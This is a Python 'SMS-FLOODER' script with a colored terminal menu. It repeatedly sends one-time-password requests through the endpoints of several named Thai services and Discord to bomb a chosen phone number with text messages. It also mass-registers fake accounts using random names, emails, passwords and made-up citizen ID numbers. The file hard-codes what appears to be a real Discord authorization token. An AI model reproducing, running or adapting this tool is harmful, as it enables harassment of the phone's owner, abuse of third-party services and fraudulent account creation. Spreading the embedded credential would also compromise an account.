import json
import time
import string
import requests
import colorama
import threading
import os
import time
from random import *

class Secret():
    discordtoken = "ODcwNjA2MjEzMjMzMTI3NDI0.YQPNOg.2Ap0KCQ7Z8AtiQGhm9ShEDuFBD4"

class URL():
    url_list = len(["aisplay","cpfreshmart","scgid","pizza1112","setmember","discord"])

    aisplay = "https://srfng.ais.co.th/login/sendOneTimePW"
    cpfreshmart = "https://cpfmapi.addressasia.com/wp-json/cpfm/v2/customer/get_otp"
    scgid = "https://api.scg-id.com/api/otp/send_otp"
    pizza1112 = "https://api2.1112.com/api/v1/otp/create"
    setmember = "https://api.set.or.th/api/otp/request"
    discord = "https://discord.com/api/v9/users/@me/phone"
    toyota = "https://www.toyotaprivilege.com/Register.aspx"

    setmemberref = "https://api.set.or.th/api/member/registration"

class StatusCode():
    success_code = [200,203,206,226,201,204,207,202,205,208]
    def response_status(response, choice):
        if response in StatusCode.success_code:
            return f"{colorama.Fore.LIGHTGREEN_EX}[{response}] {choice} SUCCESSFUL"
        return f"{colorama.Fore.LIGHTRED_EX}[{response}] {choice} UNSUCCESSFUL"

class Random():

    thailetter = ['ก', 'ข', 'ฃ', 'ค', 'ฅ', 'ฆ', 'ง', 'จ', 'ฉ', 'ช', 'ซ', 'ฌ', 'ญ', 'ฎ', 'ฏ', 'ฐ', 'ฑ', 'ฒ', 'ณ', 'ด', 'ต', 'ถ', 'ท', 'ธ', 'น', 'บ', 'ป', 'ผ', 'ฝ', 'พ', 'ฟ', 'ภ', 'ม', 'ย', 'ร', 'ฤ', 'ล', 'ฦ', 'ว', 'ศ', 'ษ', 'ส', 'ห', 'ฬ', 'อ', 'ฮ']
    def firstnamethai():
        fname = "".join(choice(Random.thailetter) for x in range(randint(8, 16)))
        return fname
    
    def lastnamethai():
        lname = "".join(choice(Random.thailetter) for x in range(randint(8, 16)))
        return lname

    def email():
        email =  "".join(choice(string.ascii_letters +string.digits) for x in range(randint(8, 12)))
        return email+"@gmail.com"

    def password():
        password =  "".join(choice(string.ascii_letters + string.punctuation  + string.digits) for x in range(randint(8, 16)))
        return password

    def identification_card():
        citizenid = randint(1000000000000,9999999999999)
        return citizenid
        
class SMSspammer():
    def spamaisplay(number,count):
        i=0
        data = f"msisdn=66{number[1:]}&serviceId=AISPlay&accountType=all&otpChannel=sms"
        headers = {
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36"
            }
        for i in range(count):
            response = requests.Session().post(URL.aisplay,data=data,headers=headers)
            print(StatusCode.response_status(response.status_code, "AISplay"))
            i = i +1
            time.sleep(0.25)

    def spamcp(number,count):
        i=0
        data = {"phone": number}
        headers = {
            "Content-Type": "application/json;charset=UTF-8",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36"
            }
        for i in range(count):
            response = requests.Session().post(URL.cpfreshmart, json=data, headers=headers)
            print(StatusCode.response_status(response.status_code, "CP"))
            i =i +1
            time.sleep(0.25)

    def spamscg(number,count):
        i=0
        data = {"phone_no": number}
        headers = {
            "Content-Type": "application/json;charset=UTF-8",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36"
            }
        for i in range(count):
            response = requests.Session().post(URL.scgid,json=data ,headers=headers)
            print(StatusCode.response_status(response.status_code, "SCG"))
            i =i +1
            time.sleep(0.25)

    def spam1112(number,count):
        i=0
        data = {"phonenumber": number, "language": "th"}
        headers = {
            "Content-Type": "application/json;charset=UTF-8",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36"
            }
        for i in range(count):
            response = requests.Session().post(URL.pizza1112,json=data,headers=headers)
            print(StatusCode.response_status(response.status_code , "1112"))
            i =i +1
            time.sleep(0.25)
    
    def spamsetmember(number,count):
        i = 0
        citizenid = Random.identification_card()
        password = Random.password()
        fname = Random.firstnamethai()
        lname = Random.lastnamethai()
        email = Random.email()
        data = {"citizenId":citizenid,
        "passport":"",          
        "country":"th",
        "termFlag":"true",
        "subscriptionFlag":"true",
        "email":email,
        "password":password,
        "gender":"M",
        "firstName":fname,
        "lastName":lname,
        "mobile":f"+66{number[1:]}"}

        headers = {
            "content-type": "application/json",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36"
        }
        for i in range(count):
            response = requests.Session().post(URL.setmemberref,json=data,headers=headers)
            refid = response.json()["userRef"]
            dataref = {"type":"REGISTRATION","refID":refid,"channel":"MOBILE"}
            response = requests.Session().post(URL.setmember,json=dataref,headers=headers)
            print(StatusCode.response_status(response.status_code , "SET-Member"))  
            i =i +1
            time.sleep(0.25)
    
    def spamdiscord(number,count):
        i=0
        data = {"phone":f"+66{number[1:]}"}
        headers = {"content-type": "application/json",
            "authorization":Secret.discordtoken}
        for i in range(count):
            response = requests.Session().post(URL.discord,json=data,headers=headers)
            print(StatusCode.response_status(response.status_code , "Discord"))
            i =i +1
            time.sleep(0.25)

class SpamMenu():
    logo = f"""                                                                                                                   
    {colorama.Fore.LIGHTBLUE_EX}              ██████  ███▄ ▄███▓  ██████      █████▒██▓     ▒█████   ▒█████  ▓█████▄ ▓█████  ██▀███     {colorama.Fore.WHITE}B{colorama.Fore.LIGHTBLUE_EX} 
                ▒██    ▒ ▓██▒▀█▀ ██▒▒██    ▒    ▓██   ▒▓██▒    ▒██▒  ██▒▒██▒  ██▒▒██▀ ██▌▓█   ▀ ▓██ ▒ ██▒   {colorama.Fore.WHITE}Y{colorama.Fore.LIGHTBLUE_EX} 
                ░ ▓██▄   ▓██    ▓██░░ ▓██▄      ▒████ ░▒██░    ▒██░  ██▒▒██░  ██▒░██   █▌▒███   ▓██ ░▄█ ▒  
                  ▒   ██▒▒██    ▒██   ▒   ██▒   ░▓█▒  ░▒██░    ▒██   ██░▒██   ██░░▓█▄   ▌▒▓█  ▄ ▒██▀▀█▄     {colorama.Fore.WHITE}R{colorama.Fore.LIGHTBLUE_EX} 
                ▒██████▒▒▒██▒   ░██▒▒██████▒▒   ░▒█░   ░██████▒░ ████▓▒░░ ████▓▒░░▒████▓ ░▒████▒░██▓ ▒██▒   {colorama.Fore.WHITE}E{colorama.Fore.LIGHTBLUE_EX} 
                ▒ ▒▓▒ ▒ ░░ ▒░   ░  ░▒ ▒▓▒ ▒ ░    ▒ ░   ░ ▒░▓  ░░ ▒░▒░▒░ ░ ▒░▒░▒░  ▒▒▓  ▒ ░░ ▒░ ░░ ▒▓ ░▒▓░   {colorama.Fore.WHITE}A{colorama.Fore.LIGHTBLUE_EX} 
                ░ ░▒  ░ ░░  ░      ░░ ░▒  ░ ░    ░     ░ ░ ▒  ░  ░ ▒ ▒░   ░ ▒ ▒░  ░ ▒  ▒  ░ ░  ░  ░▒ ░ ▒░   {colorama.Fore.WHITE}C{colorama.Fore.LIGHTBLUE_EX} 
                ░  ░  ░  ░      ░   ░  ░  ░      ░ ░     ░ ░   ░ ░ ░ ▒  ░ ░ ░ ▒   ░ ░  ░    ░     ░░   ░    {colorama.Fore.WHITE}T{colorama.Fore.LIGHTBLUE_EX}"""
    menu = f"""
                    {colorama.Fore.WHITE}[{colorama.Fore.LIGHTCYAN_EX}+{colorama.Fore.WHITE}]{colorama.Fore.CYAN} 1. ALL            {colorama.Fore.WHITE}[{colorama.Fore.LIGHTCYAN_EX}+{colorama.Fore.WHITE}]{colorama.Fore.CYAN} 6. SET-MEMBER
                    {colorama.Fore.WHITE}[{colorama.Fore.LIGHTCYAN_EX}+{colorama.Fore.WHITE}]{colorama.Fore.CYAN} 2. AISPLAY        {colorama.Fore.WHITE}[{colorama.Fore.LIGHTCYAN_EX}+{colorama.Fore.WHITE}]{colorama.Fore.CYAN} 7. DISCORD
                    {colorama.Fore.WHITE}[{colorama.Fore.LIGHTCYAN_EX}+{colorama.Fore.WHITE}]{colorama.Fore.CYAN} 3. CP             {colorama.Fore.WHITE}[{colorama.Fore.LIGHTCYAN_EX}+{colorama.Fore.WHITE}]{colorama.Fore.CYAN} 8. 
                    {colorama.Fore.WHITE}[{colorama.Fore.LIGHTCYAN_EX}+{colorama.Fore.WHITE}]{colorama.Fore.CYAN} 4. SCGID          {colorama.Fore.WHITE}[{colorama.Fore.LIGHTCYAN_EX}+{colorama.Fore.WHITE}]{colorama.Fore.CYAN} 9. 
                    {colorama.Fore.WHITE}[{colorama.Fore.LIGHTCYAN_EX}+{colorama.Fore.WHITE}]{colorama.Fore.CYAN} 5. 1112           {colorama.Fore.WHITE}[{colorama.Fore.LIGHTCYAN_EX}+{colorama.Fore.WHITE}]{colorama.Fore.CYAN} 10.
    """

class Process():   
    def clear():
        os.system("cls" if os.name == "nt" else "clear")
    
    def taskfinish(number, count , timetaken,method):
        Process.clear()
        print(f"""\n\n\n\n                       
                                        {colorama.Fore.WHITE} [{colorama.Fore.LIGHTCYAN_EX}*{colorama.Fore.WHITE}] {colorama.Fore.CYAN}TARGER {colorama.Fore.WHITE}| {number}
                                        {colorama.Fore.WHITE} [{colorama.Fore.LIGHTCYAN_EX}*{colorama.Fore.WHITE}] {colorama.Fore.CYAN}METHOD {colorama.Fore.WHITE}| {method}
                                        {colorama.Fore.WHITE} [{colorama.Fore.LIGHTCYAN_EX}*{colorama.Fore.WHITE}] {colorama.Fore.CYAN}TOTAL  {colorama.Fore.WHITE}| {count}
                                        {colorama.Fore.WHITE} [{colorama.Fore.LIGHTCYAN_EX}*{colorama.Fore.WHITE}] {colorama.Fore.CYAN}TIME   {colorama.Fore.WHITE}| {timetaken}            
                                        """)
        input("\n                                         PRESS ENTER TO CONTINUE")
        Process.clear()
        main()

    def method(number):
        print(f"                    {colorama.Fore.LIGHTBLACK_EX}METHOD (NUMBER)")
        method = str(input(f"                    {colorama.Fore.WHITE}> "))
        if method == "1" or method.lower() == "all":
            print(f"                    {colorama.Fore.LIGHTBLACK_EX}LOOP")
            count = int(input(f"                    {colorama.Fore.WHITE}> "))
            if count <= 0:
                return main()

            threads = []
            z = ((URL.url_list) * count)
            threads = [threading.Thread(target=function(number,count)) for function in (SMSspammer.spamaisplay, SMSspammer.spamcp, SMSspammer.spamscg,SMSspammer.spam1112,SMSspammer.spamsetmember,SMSspammer.spamdiscord)]
            start = time.time()
            for thread in threads:
                thread.start() 

            for thread in threads:
                thread.join() 
            
            timetaken = time.time() - start

            Process.taskfinish(number , z , timetaken,"ALL") 
            time.sleep(0.25)

        if method == "2" or method.lower() == "aisplay":
            print(f"                    {colorama.Fore.LIGHTBLACK_EX}LOOP")
            count = int(input(f"                    {colorama.Fore.WHITE}> "))
            if count <= 0:
                return main()
            start = time.time()
            SMSspammer.spamaisplay(number,count)
            timetaken = time.time() - start
            
            Process.taskfinish(number,count ,timetaken, "AISPLAY")

        elif method == "3" or method.lower() == "cp":
            print(f"                    {colorama.Fore.LIGHTBLACK_EX}LOOP")
            count = int(input(f"                    {colorama.Fore.WHITE}> "))
            if count <= 0:
                return main()
            start = time.time()
            SMSspammer.spamcp(number,count)
            timetaken = time.time() - start
            Process.taskfinish(number,count ,timetaken, "CP")
        
        elif method == "4" or method.lower() == "scg":
            print(f"                    {colorama.Fore.LIGHTBLACK_EX}LOOP")
            count = int(input(f"                    {colorama.Fore.WHITE}> "))
            if count <= 0:
                return main()
            start = time.time()
            SMSspammer.spamscg(number,count)
            timetaken = time.time() - start
            Process.taskfinish(number,count ,timetaken, "SCG")

        elif method == "5" or method.lower() == "1112":
            print(f"                    {colorama.Fore.LIGHTBLACK_EX}LOOP")
            count = int(input(f"                    {colorama.Fore.WHITE}> "))
            if count <= 0:
                return main()
            start = time.time()   
            SMSspammer.spam1112(number,count)
            timetaken = time.time() - start
            Process.taskfinish(number,count ,timetaken, "1112")
        
        elif method == "6"or method.lower() == "set-member" or method.lower() == "setmember":
            print(f"                    {colorama.Fore.LIGHTBLACK_EX}LOOP")
            count = int(input(f"                    {colorama.Fore.WHITE}> "))
            if count <= 0:
                return main()
            start = time.time()   
            SMSspammer.spamsetmember(number,count)
            timetaken = time.time() - start
            Process.taskfinish(number,count ,timetaken, "SET-Member")
        
        elif method == "7":
            print(f"                    {colorama.Fore.LIGHTBLACK_EX}LOOP")
            count = int(input(f"                    {colorama.Fore.WHITE}> "))
            if count <= 0:
                return main()
            start = time.time()   
            SMSspammer.spamdiscord(number,count)
            timetaken = time.time() - start
            Process.taskfinish(number,count ,timetaken, "Discord")
        
        else:
            print(f"                    {colorama.Fore.LIGHTBLACK_EX}INAVLID CHOICE{colorama.Fore.LIGHTBLACK_EX}")
            input("                    PRESS ENTER TO RESTART")
            main()

def main():
    Process.clear()
    os.system(f"title SMS-FLOODER ^| ALL API : {URL.url_list} ^| BY REACT", shell=False)
    print(SpamMenu.logo + "\n" + SpamMenu.menu)
    print(f"                    {colorama.Fore.LIGHTBLACK_EX}PLEASE ENTER YOUR PHONE NUMBER")
    number = str(input(f"                    {colorama.Fore.WHITE}> "))
    if len(number) != 10:
        if len(number) < 2 or number[0] + number[1] == "66":
            number = (f"0{number[2:]}")
            if len(number) != 10:
                print(f"                    {colorama.Fore.LIGHTBLACK_EX}INAVLID NUMBER{colorama.Fore.LIGHTBLACK_EX}")
                input("                    PRESS ENTER TO RESTART")
                main()
        
        elif len(number) < 3 or number[0] + number[1] + number[2] == "+66":
            number = (f"0{number[3:]}")
            if len(number) != 10:
                print(f"                    {colorama.Fore.LIGHTBLACK_EX}INAVLID NUMBER{colorama.Fore.LIGHTBLACK_EX}")
                input("                    PRESS ENTER TO RESTART")
                main()
            
        else:
            print(f"                    {colorama.Fore.LIGHTBLACK_EX}INAVLID NUMBER{colorama.Fore.LIGHTBLACK_EX}")
            input("                    PRESS ENTER TO RESTART")
            main()
        
    Process.method(number)
    
main()
